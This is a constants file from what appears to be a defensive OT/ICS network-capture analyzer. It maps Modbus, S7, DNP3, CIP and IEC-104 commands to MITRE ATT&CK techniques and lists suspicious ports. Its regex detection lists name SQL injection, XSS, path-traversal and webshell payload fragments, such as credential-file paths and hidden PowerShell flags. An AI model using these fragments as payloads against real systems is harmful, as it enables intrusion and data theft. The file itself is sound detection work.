"""
OT PCAP Analyzer - Constants
============================
All constants, protocol definitions, MITRE mappings, and translations.
"""

from enum import Enum, auto
from typing import Dict, List, Tuple, Any, Optional
import re

# =============================================================================
# PROTOCOL DEFINITIONS
# =============================================================================

class OTProtocol(Enum):
    """OT/ICS Protocol identifiers"""
    MODBUS_TCP = auto()
    MODBUS_RTU = auto()
    S7COMM = auto()
    S7COMM_PLUS = auto()
    DNP3 = auto()
    ENIP = auto()
    CIP = auto()
    BACNET = auto()
    OPC_UA = auto()
    IEC_104 = auto()
    IEC_61850_MMS = auto()
    IEC_61850_GOOSE = auto()
    IEC_61850_SV = auto()
    C37_118 = auto()
    PROFINET_DCP = auto()
    PROFINET_RT = auto()
    MQTT = auto()
    COAP = auto()
    FINS = auto()
    MELSEC = auto()
    PROFINET_CM = auto()
    UNKNOWN = auto()


# OT Protocol Ports
OT_PORTS: Dict[int, str] = {
    502: "MODBUS_TCP",
    102: "S7COMM",
    44818: "ENIP",
    2222: "ENIP_EXPLICIT",
    20000: "DNP3",
    47808: "BACNET",
    4840: "OPC_UA",
    2404: "IEC_104",
    1883: "MQTT",
    8883: "MQTT_TLS",
    5683: "COAP",
    9600: "FINS",
    5007: "MELSEC",
}


# Format: func_code -> (name, operation_type, risk_level, mitre_techniques)
MODBUS_FUNCTIONS: Dict[int, Tuple[str, str, str, List[str]]] = {
    1: ("Read Coils", "READ", "LOW", []),
    2: ("Read Discrete Inputs", "READ", "LOW", []),
    3: ("Read Holding Registers", "READ", "LOW", ["T0801", "T0802"]),
    4: ("Read Input Registers", "READ", "LOW", ["T0801", "T0802"]),
    5: ("Write Single Coil", "WRITE", "MEDIUM", ["T0831", "T0836"]),
    6: ("Write Single Register", "WRITE", "MEDIUM", ["T0831", "T0836"]),
    7: ("Read Exception Status", "DIAGNOSTIC", "LOW", []),
    8: ("Diagnostics", "DIAGNOSTIC", "MEDIUM", ["T0824"]),
    15: ("Write Multiple Coils", "WRITE", "HIGH", ["T0831", "T0833", "T0835"]),
    16: ("Write Multiple Registers", "WRITE", "HIGH", ["T0831", "T0833", "T0835"]),
    17: ("Report Server ID", "DIAGNOSTIC", "LOW", ["T0808", "T0824"]),
    22: ("Mask Write Register", "WRITE", "MEDIUM", ["T0831", "T0836"]),
    23: ("Read/Write Multiple Registers", "READ_WRITE", "HIGH", ["T0831", "T0833"]),
    43: ("Encapsulated Interface Transport", "DIAGNOSTIC", "MEDIUM", []),
    65: ("Restart Communications", "CONTROL", "CRITICAL", ["T0816", "T0815"]),
    66: ("Clear Event Log", "CONTROL", "CRITICAL", ["T0872"]),
    90: ("Firmware Update", "CONTROL", "CRITICAL", ["T0839", "T0800"]),
}


S7_FUNCTIONS: Dict[int, Tuple[str, str, str, List[str]]] = {
    0x00: ("CPU Services", "CONTROL", "HIGH", ["T0824", "T0808"]),
    0x04: ("Read Variable", "READ", "LOW", ["T0801", "T0802"]),
    0x05: ("Write Variable", "WRITE", "HIGH", ["T0831", "T0833"]),
    0x1A: ("Request Download", "CONTROL", "CRITICAL", ["T0843", "T0873"]),
    0x1B: ("Download Block", "CONTROL", "CRITICAL", ["T0843", "T0833"]),
    0x1C: ("End Download", "CONTROL", "CRITICAL", ["T0843"]),
    0x1D: ("Start Upload", "CONTROL", "CRITICAL", ["T0844", "T0811"]),
    0x1E: ("Upload", "CONTROL", "CRITICAL", ["T0844", "T0811"]),
    0x1F: ("End Upload", "CONTROL", "CRITICAL", ["T0844"]),
    0x28: ("PLC Control", "CONTROL", "CRITICAL", ["T0858", "T0816"]),
    0x29: ("PLC Stop", "CONTROL", "CRITICAL", ["T0816", "T0813"]),
    0xF0: ("Setup Communication", "SETUP", "LOW", []),
}


DNP3_FUNCTIONS: Dict[int, Tuple[str, str, str, List[str]]] = {
    0x01: ("Read", "READ", "LOW", ["T0801", "T0802"]),
    0x02: ("Write", "WRITE", "HIGH", ["T0831", "T0836"]),
    0x03: ("Select", "CONTROL", "HIGH", ["T0831"]),
    0x04: ("Operate", "CONTROL", "CRITICAL", ["T0831", "T0835"]),
    0x05: ("Direct Operate", "CONTROL", "CRITICAL", ["T0831", "T0835"]),
    0x06: ("Direct Operate No Ack", "CONTROL", "CRITICAL", ["T0831", "T0835"]),
    0x0D: ("Cold Restart", "CONTROL", "CRITICAL", ["T0816", "T0815"]),
    0x0E: ("Warm Restart", "CONTROL", "CRITICAL", ["T0816"]),
    0x0F: ("Initialize Data", "CONTROL", "HIGH", ["T0809"]),
    0x10: ("Initialize Application", "CONTROL", "HIGH", []),
    0x11: ("Start Application", "CONTROL", "HIGH", []),
    0x12: ("Stop Application", "CONTROL", "CRITICAL", ["T0816", "T0813"]),
    0x13: ("Save Configuration", "CONFIG", "MEDIUM", []),
    0x14: ("Enable Unsolicited", "CONFIG", "MEDIUM", []),
    0x15: ("Disable Unsolicited", "CONFIG", "MEDIUM", ["T0804"]),
}


CIP_SERVICES: Dict[int, Tuple[str, str, str, List[str]]] = {
    0x01: ("Get Attributes All", "READ", "LOW", ["T0801", "T0802"]),
    0x02: ("Set Attributes All", "WRITE", "HIGH", ["T0831", "T0836"]),
    0x03: ("Get Attribute List", "READ", "LOW", ["T0801"]),
    0x04: ("Set Attribute List", "WRITE", "HIGH", ["T0831", "T0836"]),
    0x05: ("Reset", "CONTROL", "CRITICAL", ["T0816", "T0815"]),
    0x06: ("Start", "CONTROL", "CRITICAL", ["T0858"]),
    0x07: ("Stop", "CONTROL", "CRITICAL", ["T0816", "T0813"]),
    0x08: ("Create", "CONFIG", "HIGH", []),
    0x09: ("Delete", "CONFIG", "HIGH", ["T0809"]),
    0x0E: ("Get Attribute Single", "READ", "LOW", ["T0801"]),
    0x10: ("Set Attribute Single", "WRITE", "MEDIUM", ["T0831", "T0836"]),
    0x4B: ("Execute PCCC", "CONTROL", "HIGH", []),
    0x4C: ("Read Tag", "READ", "LOW", ["T0801", "T0802"]),
    0x4D: ("Write Tag", "WRITE", "HIGH", ["T0831", "T0833", "T0836"]),
    0x4E: ("Read Tag Fragmented", "READ", "LOW", ["T0801", "T0802"]),
    0x4F: ("Write Tag Fragmented", "WRITE", "HIGH", ["T0831", "T0833"]),
    0x52: ("Read Modify Write Tag", "READ_WRITE", "HIGH", ["T0831", "T0833"]),
}


IEC104_ASDU_TYPES: Dict[int, Tuple[str, str, str, str]] = {
    1: ("M_SP_NA_1", "Single-point information", "READ", "LOW"),
    3: ("M_DP_NA_1", "Double-point information", "READ", "LOW"),
    9: ("M_ME_NA_1", "Measured value, normalized", "READ", "LOW"),
    11: ("M_ME_NB_1", "Measured value, scaled", "READ", "LOW"),
    13: ("M_ME_NC_1", "Measured value, short float", "READ", "LOW"),
    45: ("C_SC_NA_1", "Single command", "CONTROL", "HIGH"),
    46: ("C_DC_NA_1", "Double command", "CONTROL", "HIGH"),
    47: ("C_RC_NA_1", "Regulating step command", "CONTROL", "HIGH"),
    48: ("C_SE_NA_1", "Setpoint command, normalized", "CONTROL", "HIGH"),
    50: ("C_SE_NB_1", "Setpoint command, scaled", "CONTROL", "HIGH"),
    100: ("C_IC_NA_1", "Interrogation command", "READ", "MEDIUM"),
    101: ("C_CI_NA_1", "Counter interrogation", "READ", "MEDIUM"),
    103: ("C_CS_NA_1", "Clock synchronization", "CONFIG", "MEDIUM"),
    105: ("C_RP_NA_1", "Reset process command", "CONTROL", "CRITICAL"),
}


SUSPICIOUS_PATTERNS: Dict[str, dict] = {
    "RAPID_WRITE": {"threshold": 10, "window_sec": 5, "risk": "HIGH"},
    "SCAN_DETECTED": {"threshold": 50, "window_sec": 10, "risk": "MEDIUM"},
    "UNAUTHORIZED_COMMAND": {"protocols": ["MODBUS", "S7COMM"], "risk": "CRITICAL"},
    "FIRMWARE_UPDATE": {"risk": "CRITICAL"},
    "PLC_STOP": {"risk": "CRITICAL"},
    "TIME_SYNC_ANOMALY": {"risk": "MEDIUM"},
}


# =============================================================================
# MITRE ATT&CK MAPPINGS
# =============================================================================

MITRE_ATTACK_ICS: Dict[str, str] = {
    "T0800": "Activate Firmware Update Mode",
    "T0801": "Monitor Process State",
    "T0802": "Automated Collection",
    "T0803": "Block Command Message",
    "T0804": "Block Reporting Message",
    "T0805": "Block Serial COM",
    "T0806": "Brute Force I/O",
    "T0807": "Command-Line Interface",
    "T0808": "Control Device Identification",
    "T0809": "Data Destruction",
    "T0810": "Data Historian Compromise",
    "T0811": "Data from Information Repositories",
    "T0812": "Default Credentials",
    "T0813": "Denial of Control",
    "T0814": "Denial of View",
    "T0815": "Denial of Service",
    "T0816": "Device Restart/Shutdown",
    "T0817": "Drive-by Compromise",
    "T0818": "Engineering Workstation Compromise",
    "T0819": "Exploit Public-Facing Application",
    "T0820": "Exploitation for Evasion",
    "T0821": "Modify Controller Tasking",
    "T0822": "External Remote Services",
    "T0823": "Graphical User Interface",
    "T0824": "I/O Module Discovery",
    "T0825": "Location Identification",
    "T0826": "Loss of Availability",
    "T0827": "Loss of Control",
    "T0828": "Loss of Productivity and Revenue",
    "T0829": "Loss of Protection",
    "T0830": "Man in the Middle",
    "T0831": "Manipulation of Control",
    "T0832": "Manipulation of View",
    "T0833": "Modify Control Logic",
    "T0834": "Native API",
    "T0835": "Manipulate I/O Image",
    "T0836": "Modify Parameter",
    "T0837": "Loss of Protection",
    "T0838": "Modify Alarm Settings",
    "T0839": "Module Firmware",
    "T0840": "Network Connection Enumeration",
    "T0841": "Network Service Scanning",
    "T0842": "Network Sniffing",
    "T0843": "Program Download",
    "T0844": "Program Upload",
    "T0845": "Program Organization Units",
    "T0846": "Remote System Discovery",
    "T0847": "Replication Through Removable Media",
    "T0848": "Rogue Master Device",
    "T0849": "Masquerading",
    "T0850": "Role Identification",
    "T0851": "Rootkit",
    "T0852": "Screen Capture",
    "T0853": "Scripting",
    "T0854": "Serial Connection Enumeration",
    "T0855": "Unauthorized Command Message",
    "T0856": "Spoof Reporting Message",
    "T0857": "System Firmware",
    "T0858": "Change Operating Mode",
    "T0859": "Valid Accounts",
    "T0860": "Wireless Compromise",
    "T0861": "Point & Tag Identification",
    "T0862": "Supply Chain Compromise",
    "T0863": "User Execution",
    "T0864": "Transient Cyber Asset",
    "T0865": "Spearphishing Attachment",
    "T0866": "Exploitation of Remote Services",
    "T0867": "Lateral Tool Transfer",
    "T0868": "Detect Operating Mode",
    "T0869": "Standard Application Layer Protocol",
    "T0870": "Detect Program State",
    "T0871": "Execution through API",
    "T0872": "Indicator Removal on Host",
    "T0873": "Project File Infection",
    "T0874": "Hooking",
}


MITRE_ATTACK_ENTERPRISE: Dict[str, str] = {
    "T1190": "Exploit Public-Facing Application",
    "T1133": "External Remote Services",
    "T1078": "Valid Accounts",
    "T1199": "Trusted Relationship",
    "T1566": "Phishing",
    "T1059": "Command and Scripting Interpreter",
    "T1203": "Exploitation for Client Execution",
    "T1047": "Windows Management Instrumentation",
    "T1098": "Account Manipulation",
    "T1136": "Create Account",
    "T1053": "Scheduled Task/Job",
    "T1068": "Exploitation for Privilege Escalation",
    "T1548": "Abuse Elevation Control Mechanism",
    "T1070": "Indicator Removal",
    "T1036": "Masquerading",
    "T1027": "Obfuscated Files or Information",
    "T1110": "Brute Force",
    "T1003": "OS Credential Dumping",
    "T1558": "Steal or Forge Kerberos Tickets",
    "T1552": "Unsecured Credentials",
    "T1046": "Network Service Scanning",
    "T1135": "Network Share Discovery",
    "T1018": "Remote System Discovery",
    "T1082": "System Information Discovery",
    "T1016": "System Network Configuration Discovery",
    "T1049": "System Network Connections Discovery",
    "T1021": "Remote Services",
    "T1080": "Taint Shared Content",
    "T1570": "Lateral Tool Transfer",
    "T1550": "Use Alternate Authentication Material",
    "T1560": "Archive Collected Data",
    "T1005": "Data from Local System",
    "T1039": "Data from Network Shared Drive",
    "T1071": "Application Layer Protocol",
    "T1095": "Non-Application Layer Protocol",
    "T1572": "Protocol Tunneling",
    "T1090": "Proxy",
    "T1219": "Remote Access Software",
    "T1041": "Exfiltration Over C2 Channel",
    "T1048": "Exfiltration Over Alternative Protocol",
    "T1567": "Exfiltration Over Web Service",
    "T1485": "Data Destruction",
    "T1486": "Data Encrypted for Impact",
    "T1489": "Service Stop",
    "T1490": "Inhibit System Recovery",
    "T1498": "Network Denial of Service",
    "T1499": "Endpoint Denial of Service",
    # Additional techniques detected by analyzer
    "T1001": "Data Obfuscation",
    "T1040": "Network Sniffing",
    "T1055": "Process Injection",
    "T1083": "File and Directory Discovery",
    "T1102": "Web Service",
    "T1105": "Ingress Tool Transfer",
    "T1132": "Data Encoding",
    "T1140": "Deobfuscate/Decode Files or Information",
    "T1189": "Drive-by Compromise",
    "T1210": "Exploitation of Remote Services",
    "T1213": "Data from Information Repositories",
    "T1505": "Server Software Component",
    "T1543": "Create or Modify System Process",
    "T1547": "Boot or Logon Autostart Execution",
    "T1557": "Adversary-in-the-Middle",
    "T1568": "Dynamic Resolution",
    "T1573": "Encrypted Channel",
    "T1590": "Gather Victim Network Information",
    "T1595": "Active Scanning",
    "T1599": "Network Boundary Bridging",
}


MITRE_ENTERPRISE_DESCRIPTIONS: Dict[str, str] = {
    "T1190": "Exploit Public-Facing Application",
    "T1133": "External Remote Services - VPN, RDP, SSH",
    "T1078": "Use of stolen valid accounts",
    "T1110": "Brute Force - Password guessing",
    "T1003": "Credential theft",
    "T1046": "Network Service Scanning",
    "T1021": "Remote Services - Lateral movement",
    "T1071": "Application Layer Protocol - C2",
    "T1041": "Exfiltration over C2",
    "T1498": "Network Denial of Service",
    "T1485": "Data Destruction",
    "T1486": "Data Encrypted for Impact (Ransomware)",
}


# =============================================================================
# HUMAN-READABLE DESCRIPTIONS
# =============================================================================

MITRE_TOOLTIPS: Dict[str, str] = {
    "T0800": "Activate firmware update mode - May be a preparatory step for an attack",
    "T0801": "Monitor process state - Collecting system information",
    "T0816": "Device restart/shutdown - Disrupts operations",
    "T0831": "Manipulation of control - Sending spoofed commands to devices",
    "T0833": "Modify control logic - Changing the PLC program",
    "T0858": "Change operating mode - Switching the PLC to another mode",
    "T1046": "Network service scanning - Discovering devices and open ports",
}


MODBUS_FUNCTION_DESCRIPTIONS: Dict[int, str] = {
    1: "Read Coil status (DO)",
    2: "Read Discrete Input status (DI)",
    3: "Read Holding Registers",
    4: "Read Input Registers",
    5: "WRITE SINGLE COIL - Controls a digital output",
    6: "WRITE SINGLE REGISTER - Changes a value",
    15: "WRITE MULTIPLE COILS - Bulk control",
    16: "WRITE MULTIPLE REGISTERS - Changes multiple values",
    65: "RESTART COMMUNICATIONS",
    90: "FIRMWARE UPDATE - High risk",
}


S7_FUNCTION_DESCRIPTIONS: Dict[int, str] = {
    0x04: "Read variables/data from PLC",
    0x05: "WRITE DATA - Changes values in the PLC",
    0x1B: "PROGRAM DOWNLOAD - Uploading code to the PLC",
    0x28: "PLC CONTROL - Direct control command",
    0x29: "IMMEDIATE PLC STOP",
}


ALERT_CATEGORIES: Dict[str, Dict[str, Any]] = {
    "SECURITY": {
        "name": "Security Alert",
        "description": "Signs of intrusion or network attack",
        "icon": "red_circle",
        "color": "#dc2626",
        "indicators": ["SCAN", "BRUTE", "INJECTION", "UNAUTHORIZED", "SPOOFING",
                      "REPLAY", "MAN_IN_MIDDLE", "FIRMWARE", "STOP", "RESTART",
                      "CREDENTIAL", "EXPLOIT", "MALWARE", "LATERAL"]
    },
    "OPERATIONAL": {
        "name": "Operational Anomaly",
        "description": "Protocol deviation or device fault",
        "icon": "yellow_circle",
        "color": "#f59e0b",
        "indicators": ["PROTOCOL_ERROR", "SEQUENCE", "TIMING", "CHECKSUM",
                      "MALFORMED", "TIMEOUT", "RETRY", "SYNC", "CONFIG_CHANGE"]
    },
    "INFORMATIONAL": {
        "name": "Informational",
        "description": "Normal activity to be monitored",
        "icon": "blue_circle",
        "color": "#3b82f6",
        "indicators": ["READ", "QUERY", "POLL", "HEARTBEAT", "STATUS"]
    }
}


REMEDIATION_TEMPLATES: Dict[str, Dict[str, str]] = {
    "WRITE_COMMAND": {
        "title": "Write/control command detected",
        "guidance": "Check immediately: 1) Verify the source IP is on the whitelist, 2) Check whether the time matches a maintenance schedule, 3) Contact a technician to confirm",
        "priority": "HIGH"
    },
    "FIRMWARE_UPDATE": {
        "title": "Firmware update detected",
        "guidance": "HIGH-LEVEL WARNING: 1) STOP IMMEDIATELY if no update is scheduled, 2) Check the source, 3) Verify with the IT/OT team",
        "priority": "CRITICAL"
    },
    "PLC_STOP": {
        "title": "PLC/RTU stop command detected",
        "guidance": "URGENT: 1) Was the stop ordered by the dispatcher? 2) Is the IP on the whitelist? 3) Is the timing reasonable?",
        "priority": "CRITICAL"
    },
    "SCAN_ACTIVITY": {
        "title": "Network scanning activity detected",
        "guidance": "Check: 1) Is the IP a maintenance workstation? 2) Is there a scheduled security assessment? 3) Check the list of authorized devices",
        "priority": "MEDIUM"
    },
    "DEFAULT": {
        "title": "Event requiring review",
        "guidance": "Verify the connection origin and compare against the baseline",
        "priority": "LOW"
    }
}


# =============================================================================
# IT ATTACK SIGNATURES
# =============================================================================

IT_ATTACK_SIGNATURES: Dict[str, Dict[str, Any]] = {
    "TCP_SYN_SCAN": {
        "name": "TCP SYN Scan",
        "description": "TCP port scan using SYN packets detected",
        "severity": "MEDIUM",
        "mitre": ["T1046"],
    },
    "ARP_SPOOFING": {
        "name": "ARP Spoofing/Poisoning",
        "description": "ARP spoofing attack detected",
        "severity": "CRITICAL",
        "mitre": ["T1557.002", "T1040"],
    },
    "DNS_TUNNELING": {
        "name": "DNS Tunneling",
        "description": "Use of DNS to transfer data detected",
        "severity": "CRITICAL",
        "mitre": ["T1071.004", "T1048.003"],
    },
    "SSH_BRUTE_FORCE": {
        "name": "SSH Brute Force",
        "description": "Multiple failed SSH login attempts detected",
        "severity": "HIGH",
        "mitre": ["T1110.001", "T1021.004"],
    },
    "RDP_BRUTE_FORCE": {
        "name": "RDP Brute Force",
        "description": "Remote Desktop password-guessing attack detected",
        "severity": "CRITICAL",
        "mitre": ["T1110.001", "T1021.001"],
    },
    "SMB_BRUTE_FORCE": {
        "name": "SMB Brute Force",
        "description": "Password-guessing attack against Windows shares",
        "severity": "HIGH",
        "mitre": ["T1110.001", "T1021.002"],
    },
    "MITM_DETECTED": {
        "name": "Man-in-the-Middle Attack",
        "description": "Signs of a MITM attack detected",
        "severity": "CRITICAL",
        "mitre": ["T1557", "T1040"],
    },
    "SYN_FLOOD": {
        "name": "TCP SYN Flood Attack",
        "description": "Overflows the server's SYN queue",
        "severity": "CRITICAL",
        "mitre": ["T1498.001", "T1499"],
    },
    "PASS_THE_HASH": {
        "name": "Pass the Hash Attack",
        "description": "Uses an NTLM hash instead of a password",
        "severity": "CRITICAL",
        "mitre": ["T1550.002"],
    },
    "LATERAL_MOVEMENT_SMB": {
        "name": "SMB Lateral Movement",
        "description": "Lateral movement within the network detected",
        "severity": "CRITICAL",
        "mitre": ["T1021.002", "T1570"],
    },
    "DATA_EXFIL_LARGE": {
        "name": "Large Data Exfiltration",
        "description": "Large outbound data transfer detected",
        "severity": "CRITICAL",
        "mitre": ["T1041", "T1048"],
    },
}


SUSPICIOUS_PORTS: Dict[int, Tuple[str, str, str]] = {
    4444: ("Metasploit default", "CRITICAL", "Meterpreter reverse shell"),
    5555: ("Android Debug Bridge", "HIGH", "ADB - may be abused"),
    6666: ("IRC Bot", "HIGH", "Common botnet C2"),
    6667: ("IRC", "MEDIUM", "Possible C2 channel"),
    31337: ("Back Orifice", "CRITICAL", "Classic RAT"),
    12345: ("NetBus", "CRITICAL", "Classic RAT"),
    3333: ("Crypto mining pool", "HIGH", "Stratum mining protocol"),
    8080: ("HTTP Proxy/C2", "MEDIUM", "Possible C2 or proxy"),
    9001: ("Tor default", "HIGH", "Tor network - possible C2"),
    5900: ("VNC", "HIGH", "Remote desktop - should not be present in OT"),
    3389: ("RDP", "HIGH", "Remote Desktop - high risk in OT"),
    23: ("Telnet", "CRITICAL", "UNENCRYPTED - should not be used"),
}


IT_ADMIN_PROTOCOLS: Dict[int, Dict[str, str]] = {
    22: {"name": "SSH", "risk_in_ot": "HIGH", "desc": "Secure Shell"},
    23: {"name": "Telnet", "risk_in_ot": "CRITICAL", "desc": "UNENCRYPTED"},
    3389: {"name": "RDP", "risk_in_ot": "CRITICAL", "desc": "Ransomware target"},
    5900: {"name": "VNC", "risk_in_ot": "HIGH", "desc": "Virtual Network Computing"},
    445: {"name": "SMB", "risk_in_ot": "HIGH", "desc": "EternalBlue"},
    135: {"name": "RPC/DCOM", "risk_in_ot": "HIGH", "desc": "WMI lateral"},
    139: {"name": "NetBIOS", "risk_in_ot": "HIGH", "desc": "NetBIOS Session"},
}


# =============================================================================
# IT PROTOCOL PARSING CONSTANTS
# =============================================================================

# DNS Query Types
DNS_QUERY_TYPES: Dict[int, str] = {
    1: "A",         # IPv4 Address
    2: "NS",        # Name Server
    5: "CNAME",     # Canonical Name
    6: "SOA",       # Start of Authority
    12: "PTR",      # Pointer Record
    15: "MX",       # Mail Exchange
    16: "TXT",      # Text Record - often used in tunneling
    28: "AAAA",     # IPv6 Address
    33: "SRV",      # Service Record
    255: "ANY",     # Any type - suspicious if frequent
}

# DNS Tunneling Detection Indicators
DNS_TUNNELING_INDICATORS: Dict[str, Any] = {
    "long_subdomain_threshold": 50,       # Characters in subdomain
    "high_entropy_threshold": 3.5,        # Entropy of subdomain
    "txt_query_rate_threshold": 20,       # TXT queries per minute per host
    "unique_subdomain_threshold": 100,    # Unique subdomains per domain in 5 min
    "suspicious_tlds": [".xyz", ".tk", ".ml", ".ga", ".cf", ".gq", ".pw"],
}

# HTTP Methods with Risk Levels
HTTP_METHODS: Dict[str, Tuple[str, str]] = {
    "GET": ("READ", "LOW"),
    "POST": ("WRITE", "MEDIUM"),
    "PUT": ("WRITE", "HIGH"),
    "DELETE": ("WRITE", "HIGH"),
    "PATCH": ("WRITE", "MEDIUM"),
    "OPTIONS": ("DISCOVERY", "LOW"),
    "HEAD": ("READ", "LOW"),
    "CONNECT": ("TUNNEL", "HIGH"),       # Proxy tunneling
    "TRACE": ("DIAGNOSTIC", "MEDIUM"),   # XST attacks
}

# HTTP Suspicious Patterns for Attack Detection
# NOTE: This is the CONFIGURABLE rule-based detection system.
# To add new patterns: simply add to the appropriate category below.
# To create new category: add new key with patterns, severity, mitre, desc.
# Detection engine in analyzer.py will automatically use new patterns.

HTTP_SUSPICIOUS_PATTERNS: Dict[str, Dict[str, Any]] = {
    # =========================================================================
    # SQL INJECTION
    # =========================================================================
    "SQL_INJECTION": {
        "targets": ("uri", "body", "headers"),
        "patterns": [
            # Classic SQL injection
            r"UNION.*SELECT", r";\s*DROP", r"1=1", r"' OR '1'='1",
            # Advanced SQL injection
            r"AND\s+1=1", r"OR\s+1=1", r"'\s*OR\s*'", r"admin'--", r"admin'#",
            r"'\s*OR\s*'x'='x", r"'\s*OR\s*1=1--", r"'\s*OR\s*1=1#",
            # Boolean-based blind
            r"AND\s+\d+=\d+", r"OR\s+\d+=\d+", r"'\s*AND\s*'[a-z]+'='[a-z]+",
            # Time-based blind
            r"SLEEP\s*\(", r"WAITFOR\s+DELAY", r"BENCHMARK\s*\(", r"pg_sleep\s*\(",
            # Union-based
            r"UNION\s+ALL\s+SELECT", r"UNION\s+SELECT\s+NULL",
            r"UNION.*FROM.*information_schema", r"UNION.*FROM.*sysobjects",
            # Stacked queries
            r";\s*SELECT", r";\s*INSERT", r";\s*UPDATE", r";\s*DELETE",
            r";\s*EXEC", r";\s*EXECUTE", r";\s*xp_cmdshell",
            # Comment-based
            r"/\*.*\*/", r";\s*--", r";\s*#",
            # Database fingerprinting
            r"@@version", r"version\(\)", r"@@datadir", r"user\(\)",
            r"database\(\)", r"schema\(\)", r"current_user",
            # Error-based
            r"EXTRACTVALUE\s*\(", r"UPDATEXML\s*\(", r"AND\s+extractvalue",
            # Out-of-band
            r"LOAD_FILE\s*\(", r"INTO\s+OUTFILE", r"INTO\s+DUMPFILE",
            # Hex/char encoding
            r"CHAR\s*\(\d+", r"CONCAT\s*\(.*CHAR",
            # Database-specific
            r"information_schema\.",
            r"pg_catalog\.", r"performance_schema\.",
            # Tightened replacements (SQL comments only after a quote; schema names only as table refs)
            "(?:'|%27)\\s*(?:--|#|%23)",
            '\\bUNION\\b.{0,40}\\bSELECT\\b',
            '\\b0x[0-9a-f]{8,}\\b',
            '\\bmsdb\\.dbo\\.',
            '\\bmysql\\.user\\b',
            '\\bsys\\.(?:objects|tables|columns|databases)\\b',
        ],
        "severity": "CRITICAL",
        "mitre": ["T1190"],
        "desc": "SQL Injection attack - All types",
    },

    # =========================================================================
    # XSS ATTACK
    # =========================================================================
    "XSS_ATTACK": {
        "patterns": [
            # Basic XSS
            r"<script", r"</script>", r"javascript:", r"onerror\s*=", r"onload\s*=", r"onclick\s*=",
            # Advanced XSS
            r"onmouseover\s*=", r"onmouseout\s*=", r"onfocus\s*=", r"onblur\s*=",
            r"onchange\s*=", r"onsubmit\s*=", r"oninput\s*=", r"onkeydown\s*=",
            r"onkeyup\s*=", r"onkeypress\s*=", r"ondblclick\s*=",
            # Event handlers
            r"<img.*src.*onerror", r"<svg.*onload", r"<iframe.*onload",
            r"<body.*onload", r"<input.*onfocus", r"<a.*onclick",
            # JavaScript protocol
            r"javascript\s*:", r"vbscript\s*:", r"data\s*:text/html",
            r"data:text/html;base64", r"data:application/javascript",
            # DOM-based XSS
            r"document\.write", r"document\.writeln", r"innerHTML\s*=",
            r"outerHTML\s*=", r"insertAdjacentHTML", r"document\.cookie",
            r"location\.href\s*=", r"location\.replace",
            # Encoded XSS
            r"%3Cscript%3E", r"%3C%2Fscript%3E",
            # Filter bypass
            r"<scr<script>ipt>", r"<img src=x onerror=",
            r"<svg/onload=", r"<iframe src=javascript:",
            # AngularJS XSS
            r"\{\{.*\}\}", r"ng-app", r"ng-bind-html",
            # Template injection XSS
            r"\$\{.*\}", r"<%=.*%>", r"\{\%.*\%\}",
            # location= only when assigning a URL ("?location=Berlin" is a normal parameter)
            '\\blocation\\s*=\\s*[\'\\"]?(?:javascript:|//|https?:)',
        ],
        "severity": "HIGH",
        "mitre": ["T1189"],
        "desc": "XSS attack - All types",
    },

    # =========================================================================
    # PATH TRAVERSAL
    # =========================================================================
    "PATH_TRAVERSAL": {
        "patterns": [
            # Basic traversal
            r"\.\./", r"\.\.\\", r"%2e%2e%2f", r"%2e%2e/", r"\.\.%2f",
            # Advanced traversal
            r"\.\./\.\./\.\./", r"\.\.\\\.\.\\\.\.\\",
            r"%2e%2e%2f%2e%2e%2f", r"%2e%2e/%2e%2e/",
            # Double encoding
            r"%252e%252e%252f", r"%c0%ae%c0%ae%c0%af",
            # Unicode encoding
            r"\.\.%c0%af", r"\.\.%c1%9c", r"\.\.\u2216", r"\.\.\u2215",
            # Absolute paths
            r"/etc/passwd", r"/etc/shadow", r"/etc/hosts",
            r"C:\\Windows\\", r"C:\\boot\.ini", r"C:\\autoexec\.bat",
            # Windows shares
            r"\\\\[^\\]+\\",
            # Null byte injection
            r"\.\./.*%00", r"\.\.\\.*%00",
            # Filter bypass
            r"\.\./\./", r"\.\.\/\./", r"\.\.\\/\./",
            # Tomcat path-parameter traversal (dots escaped)
            '\\.\\.;/',
            '\\.\\.;\\\\',
        ],
        "severity": "HIGH",
        "mitre": ["T1083"],
        "desc": "Path Traversal attack",
    },

    # =========================================================================
    # WEBSHELL DETECTION
    # =========================================================================
    "WEBSHELL": {
        "patterns": [
            # Known webshell filenames
            r"cmd\.php", r"shell\.php", r"c99\.php", r"r57\.php", r"b374k\.php",
            r"wso\.php", r"alfa\.php", r"weevely", r"china_chopper",
            # More known webshells
            r"phpspy\.php", r"antichat\.php", r"matamu\.php", r"indoxploit\.php",
            r"mini\.php", r"backdoor\.php", r"bypass\.php", r"adminer\.php",
            r"webadmin\.php", r"configkillerionkros\.php", r"locus7s\.php",
            r"mysql\.php", r"mysql_tool\.php", r"MyShell\.php", r"Safe0ver\.php",
            # PHP dangerous functions
            r"eval\s*\(", r"assert\s*\(", r"preg_replace.*\/e", r"create_function\s*\(",
            r"call_user_func\s*\(", r"call_user_func_array\s*\(",
            # More PHP execution
            r"exec\s*\(", r"system\s*\(", r"passthru\s*\(", r"shell_exec\s*\(",
            r"popen\s*\(", r"proc_open\s*\(", r"pcntl_exec\s*\(",
            # Variable functions
            r"\$\{[^\}]+\}\s*\(", r"\$\$[a-zA-Z_]+\s*\(",
            r"\$_GET\s*\[.*\]\s*\(", r"\$_POST\s*\[.*\]\s*\(",
            r"\$_REQUEST\s*\[.*\]\s*\(", r"\$_COOKIE\s*\[.*\]\s*\(",
            # Include/require with variables
            r"include\s*\(\s*\$", r"require\s*\(\s*\$",
            r"include_once\s*\(\s*\$", r"require_once\s*\(\s*\$",
            # File operations
            r"file_put_contents\s*\(", r"file_get_contents\s*\(.*http",
            r"fwrite\s*\(", r"fputs\s*\(", r"fopen\s*\(.*[rwa]\+",
            # Obfuscation indicators
            r"str_rot13\s*\(.*eval", r"base64_decode\s*\(.*eval",
            r"gzinflate\s*\(.*eval", r"convert_uudecode\s*\(",
            # Backtick execution
            r"`[^`]*`", r"\\x60.*\\x60",
        ],
        "severity": "CRITICAL",
        "mitre": ["T1505.003", "T1059.004"],
        "desc": "Webshell detected - PHP execution functions",
    },

    # =========================================================================
    # WEBSHELL COMMAND EXECUTION
    # =========================================================================
    "WEBSHELL_CMD": {
        "targets": ("uri", "body"),  # Host/Referer headers produced false positives (e.g. "Intranet\r\nUser-Agent")
        "patterns": [
            # Windows commands
            r"cmd\.exe", r"cmd\s*/c", r"powershell\.exe", r"powershell\s+-",
            r"powershell.*-enc", r"powershell.*-nop", r"powershell.*-w\s+hidden",
            # More Windows commands
